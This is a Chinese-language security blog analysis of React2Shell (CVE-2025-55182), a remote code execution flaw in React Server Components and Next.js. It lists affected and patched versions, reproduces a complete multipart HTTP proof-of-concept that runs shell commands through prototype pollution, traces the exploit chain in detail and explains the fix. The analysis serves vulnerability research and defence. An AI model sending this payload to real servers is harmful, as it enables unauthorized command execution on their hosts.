---
title: 不容错过的2025年度漏洞：React2Shell（CVE-2025-55182）分析
date: 2025-12-31 18:23:35
tags:
- rce
- react2shell
---

2025年12月3日，时隔4年，安全圈又一个通杀环境的核弹漏洞被公开，CVSS评分10.0，影响范围React 19+全版本，Next.js 15/16，无条件默认环境RCE漏洞，史称React2shell。

该漏洞由安全研究员 Lachlan Davidson 于 2025 年 11 月 29 日发现，在3号被公开

+ [https://www.tenable.com/blog/react2shell-cve-2025-55182-react-server-components-rce](https://www.tenable.com/blog/react2shell-cve-2025-55182-react-server-components-rce)

最早的版本大家讨论的结论是，只有使用rsc作为后端的环境才会受到漏洞的利用，主要原因还是受到了最早版本poc的影响，也就是ejpir专门构造的漏洞环境和poc。

但是很快maple3142在12月5日发布了真正的poc

+ [https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3](https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3)

在更快的时间内，next.js默认环境全版本通杀直接影响了以dify为代表的许多平台，一下子引爆了漏洞的影响范围，漏洞正式进入2阶段，大范围利用以及企业内部自查阶段。

<!--more-->

# 漏洞影响范围
影响范围包括

+ react-server：19.0.0，19.1.0，19.1.1，19.2.0
+ Next.js：14.3.0-canary、15.x 、16.x

修复补丁版本包括

+ React：19.0.1、19.1.2 、19.2.1
+ Next.js：14.3.0-canary.88、15.0.5、15.1.9、15.2.6、15.3.6、15.4.8、15.5.7、16.0.7

# 简单的漏洞演示
最简单的漏洞演示非常简单，直接起一个默认环境的next.js即可

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311825860.png)

poc直接用maple的即可（这里要注意这个poc不能用来打线上环境，会打挂的）

```plain
POST / HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 565

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('clac.exe').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311825975.png)

# 漏洞分析
## 什么是RSC(React Server Components)？
在了解react2shell这个漏洞之前，第一个问题一定是，为什么一个前端语言会涉及到服务端的命令执行呢？这个问题就涉及到了**React的新特性RSC(React Server Components)。**

其实理解这个特性并不是很难，如果稍微关注过现在的前端实现方式，就会大概知道现在前端页面内容大多都是由js绘制的。打开页面往往没有实际的内容，都是由**js代码完成交互获得内容并绘制页面。**

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311825517.png)

但是我们换个角度去想，如果浏览器加载页面需要先js绘制，然后页面加载结束之后再去请求后端获得数据，如果页面复杂或者数据非常多，就会很容易加载慢，页面长时间的空白，体验感很差。

那么最初解决的方法也很简单，**传统的SSR解决方案**，就是服务器直接把页面和数据做好处理，直接返回HTML，页面就可以跳过处理的部分直接显示部分内容减少加载时间。但是问题也很明显，如果请求数量多，服务器压力就会大，而且如果页面很大，请求的js和html也会很大加载也会慢。

为了解决这些问题，后来又提出了**RSC(React Server Components)**，服务端做好必要的数据处理，并以Flight协议的方式下发到客户端，客户端按照接收到的内容进行选择性水合，流式的更新前端交互内容。

在23年，Next.js13进一步延伸加入了Server Actions功能，在服务端提前定义好功能，通过客户端调用服务端运行操作，效率更高。并在后续这个特性被内置到了React中。

## 什么是Flight协议？
这个漏洞的基础根基就是Flight协议，**Flight协议就是React搞得一套用来在服务端和客户端之间传递信息的协议**，传递到前端则会影响前端页面的显示内容，传递到后端则是会执行对应的Server Actions。说白了就是一个有点儿类似于java传递序列化信息的东西。

React的服务端会在接收到请求之后经过一系列处理最终反序列化得到js对象

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311826572.png)

其实大多东西都不值得关注，其中最关键的部分是类型标识，带有特殊标记的变量会在反序列化的时候转化为对应的对象引用，这点其实和其他语言反序列化的逻辑类似。

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311826733.png)

理论上来说，反序列化并没有对内容做严格的限制，只要符合格式，就可以获得对应的js对象。

而这个漏洞的核心原理，**在服务端对传入内容解析转对象时，导致了原型链污染，最终触发代码执行。**

在实际的漏洞之前，可能还需要知道Chunk对象是什么。

## Chunk对象
在React服务端收到post请求，请求包的content-type为multipart/form-data，其中每段数据将会转化为一个Chunk对象。

```javascript
function Chunk(status: any, value: any, reason: any, response: Response) {
  this.status = status;
  this.value = value;
  this.reason = reason;
  this._response = response;
}
// We subclass Promise.prototype so that we get other methods like .catch
Chunk.prototype = (Object.create(Promise.prototype): any);
// TODO: This doesn't return a new Promise chain unlike the real .then
Chunk.prototype.then = function <T>(
  this: SomeChunk<T>,
  resolve: (value: T) => mixed,
  reject: (reason: mixed) => mixed,
) {
  const chunk: SomeChunk<T> = this;
  // If we have resolved content, we try to initialize it first which
  // might put us back into one of the other states.
  switch (chunk.status) {
    case RESOLVED_MODEL:
      initializeModelChunk(chunk);
      break;
  }
  // The status might have changed after initialization.
  switch (chunk.status) {
    case INITIALIZED:
      resolve(chunk.value);
      break;
    case PENDING:
    case BLOCKED:
    case CYCLIC:
      if (resolve) {
        if (chunk.value === null) {
          chunk.value = ([]: Array<(T) => mixed>);
        }
        chunk.value.push(resolve);
      }
      if (reject) {
        if (chunk.reason === null) {
          chunk.reason = ([]: Array<(mixed) => mixed>);
        }
        chunk.reason.push(reject);
      }
      break;
    default:
      reject(chunk.reason);
      break;
  }
};
```

这里需要关注两个case

**当case是"resolved_model"时，调用initializeModelChunk方法初始化Chunk对象**

**当case是"fulfilled"时，调用resolve方法处理**

这个Chunk对象结构将会贯穿这个漏洞很多流程

## 漏洞分析
让我们回到React处理请求的逻辑上，核心位于decodeReplyFromBusboy方法

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311826605.png)

response来自于createResponse，其中_formData刚好对应表单传入的formdata

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311826804.png)

紧接着绑定事件到field上，会对应触发resolveField处理response

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311826051.png)

一直执行到return getRoot，会尝试获得response的第0个Chunk

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311826511.png)

在getChunk中，由于_formData此时不为空，所以走到createResolvedModelChunk方法，并新建一个Chunk对象，id为0

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311826669.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311826934.png)

完成了Chunk对象的初始化之后，会触发then方法回到状态判断上

```javascript
Chunk.prototype.then = function <T>(
  this: SomeChunk<T>,
  resolve: (value: T) => mixed,
  reject: (reason: mixed) => mixed,
) {
  const chunk: SomeChunk<T> = this;
  switch (chunk.status) {
    case RESOLVED_MODEL:
      initializeModelChunk(chunk);
      break;
  }
  switch (chunk.status) {
    case INITIALIZED:
      resolve(chunk.value);
      break;
    case PENDING:
    case BLOCKED:
    case CYCLIC:
      if (resolve) {
        if (chunk.value === null) {
          chunk.value = ([]: Array<(T) => mixed>);
        }
        chunk.value.push(resolve);
      }
      if (reject) {
        if (chunk.reason === null) {
          chunk.reason = ([]: Array<(mixed) => mixed>);
        }
        chunk.reason.push(reject);
      }
      break;
    default:
      reject(chunk.reason);
      break;
  }
};
```

此时Chunk的status为RESOLVED_MODEL，所以走到initializeModelChunk方法初始化对象。

initializeModelChunk中对发送的请求做解析处理，解析完成之后会把status修改成INITIALIZED。

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311826223.png)

在reviveModel中，会解析_response的内容，当请求为string类型时，会有一段额外的指令处理逻辑，其实对应的就是前面Flight协议的类型标识

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311827137.png)

这里比较重要的有几个

+ $@后跟id，可以递归获取其他id的Chunk对象，这个后面会提到的漏洞利用涉及到的点之一
+ $B后跟id，可以获取对应formData中对应key的value，可控内容来源

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311827228.png)

如果第一个字符是$，但是后续没有走到对应的分支，将会在最终进入getOutlinedModel

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311827993.png)

在getOutlinedModel中，将会把$符号之后的内容按照`:`分割

分割后的第一段为Chunk的id，进入getChunk

**后续根据Chunk的状态进入处理，依次遍历所有的path并赋值给value，这里也是触发漏洞的位置。**

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311827778.png)

这里结合poc可能会更有感觉一些

```javascript
poc的核心部分：$1:__proto__:then
获得id为1的Chunk对象，并且获得对应的value
value2 = value["__proto__"]
value3 = value2["then"] = value["__proto__"]["then"]
```

这样一来通过原型链就可以访问任意对象的属性，那么如何用这个漏洞来实现RCE呢？

这其实涉及到一个JS的特性，其实JS的非常多各种对象都是来源于同一个原型，这也是为什么JS的原型链污染问题层出不穷，就比如说很多对象向上找都会追溯到Function对象。

就比如`[].constructor.constructor`就是一个Function对象，操作这个对象就可以实现任意代码执行。

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311827625.png)

在这个基础上我们如何读取都知道了，你怎么如何操作呢，如果我们非常简单的直接链式调用读取Function，就会遇到这样一个问题，假设请求内容为

```javascript
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:constructor:constructor"}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

此时会出现这样一个问题

```javascript
1、getChunk(0)
2、getOutlinedModel中通过分割path并且遍历getChunk(1)，返回value为[]的Chunk对象
3、最终value为[].constructor.constructor也就是Function对象
4、那么此时返回上层then的是Function对象，由于Function不是一个Promise对象，无法继续执行
```

那唯一的办法就是要让最后返回的对象也是一个Chunk对象。

这就涉及到了一个前面提到过的知识，就是`$@`

+ $@后跟id，可以递归获取其他id的Chunk对象

那这里我们尝试用一个嵌套递归逻辑来实现返回一个Chunk对象

```javascript
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then": "$1:then"}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
```

来看看这个请求的处理逻辑

```javascript
1、getChunk(0)
2、getOutlinedModel中通过分割path并且进入getChunk(1)
3、@0 触发第二次getChunk(0)，返回的是Chunk0的实例
4、返回到getOutlinedModel进入遍历，此时value对应为Chunk0的实例，return的就是Chunk对象
5、最终await触发Chunk0的then方法
```

这里我们理明白这套嵌套逻辑之后，其实还有一个问题，这就涉及到前面提到的另一个点

+ $B后跟id，可以获取对应formData中对应key的value，可控内容来源

```javascript
      case 'B': {
        // Blob
        const id = parseInt(value.slice(2), 16);
        const prefix = response._prefix;
        const blobKey = prefix + id;
        const backingEntry: Blob = (response._formData.get(blobKey): any);
        return backingEntry;
      }
```

而_prefix作为response中的可控部分，通过控制_prefix就可以指定blobKey的前半部分内容，此时如果我们通过原型链污染把get修改为Function，就可以顺利成章的触发`Function(exp)`

这里我们直接拿公开的poc来看利用逻辑

```javascript
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
    "then": "$1:__proto__:then", 
    "status": "resolved_model", 
    "reason": -1, 
    "value": "{\"then\":\"$B1337\"}", 
    "_response": {
        "_prefix": "var res=process.mainModule.require('child_process').execSync('whoami.exe').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});", 
        "_formData": {
            "get": "$1:constructor:constructor"
        }
    }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

处理逻辑如下

```javascript
1、getChunk(0)
2、getOutlinedModel中分割Chunk0的then内容，$1:__proto__:then被处理为Chunk1，path内容为[__proto__, then]
3、触发getChunk(1)
4、在Chunk1中检测到$@0，于是获得Chunk0的实例，返回给Chunk1的value
5、回到第一次getOutlinedModel中，Chunk0的value最终为Chunk0.__proto__.then
6、回到最上层触发then，此时处理内容为"{\"then\":\"$B1337\"}"
7、检测到$B，此时
    prefix为"var res=process.mainModule.require('child_process').execSync('whoami.exe').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"
    id为1337
    最终拼接获得prefix + id
8、触发_formData.get，参数为prefix + id
9、get对应的value是"$1:constructor:constructor"，$1对应getChunk1，也就是前面的Chunk0实例
10、由于Chunk本身也是一个Function，所以他的constructor.constructor也是Function
11、等于此时触发Function(prefix + id)，触发代码执行
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311827124.png)

这里也稍微看下exp的构造，其实主要是为了回显，exp如下

```javascript
var res=process.mainModule.require('child_process').execSync('whoami.exe').toString().trim();
throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});
```

按照前面的利用链来说，如果我们直接使用childprocess执行命令，那么命令会执行，但Flight的后续逻辑会走不下去，程序就卡住了。

那我们就需要手动抛出一个错误来终止程序，而React相关的代码逻辑中，如果digest有内容，他就会返回到页面内，也就是说我们可以通过手动抛出错误并控制digest内容来获取命令执行的返回。

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311828634.png)

到这里利用闭环，不但可以实现命令执行，还可以获得回显。

# 关于补丁
+ [https://github.com/facebook/react/pull/35277](https://github.com/facebook/react/pull/35277)

React关于漏洞的补丁很搞笑的是和其他的业务更新合并到了一起，这一点在github上有很多人吐槽，这也导致补丁内容非常乱，实际的漏洞修复在ReactFlightReplyServer.js的部分改动中。

主要的修复有这么几处

首先是声明了一个特殊的类型为Symbol的常量RESPONSE_SYMBOL作为response的key

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311828205.png)

后续所有关于response的引用都修改成了通过RESPONSE_SYMBOL来引用，而json_parse无法实现Symbol类型，也就无法影响reponse的内容。

还有一个是hasOwnProperty的检查，补丁中在包括getOutlinedModel在内的value处理中加入了hasOwnProperty，这样你就无法去获取原型链中未定义的属性。

<!-- 这是一张图片，ocr 内容为： -->
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202512311828040.png)

其实还有一些别的改动影响到了原利用链，但就像前面说的补丁内容牵扯到的更新太多，补丁非常乱就不细扣了。

# 总结
作为2025年的收官漏洞，同时也是4年一次难得一见的通用组件通杀漏洞，能见证并分析这种漏洞有很多感受，感叹漏洞的影响力，感叹利用链的精巧，感叹漏洞公开者的魄力。

时间走到2026年，这些年探索的更多都是安全+，很少有能深入探究漏洞本身的时候，也希望面对充满未知的2026，能保留安全研究的初心。
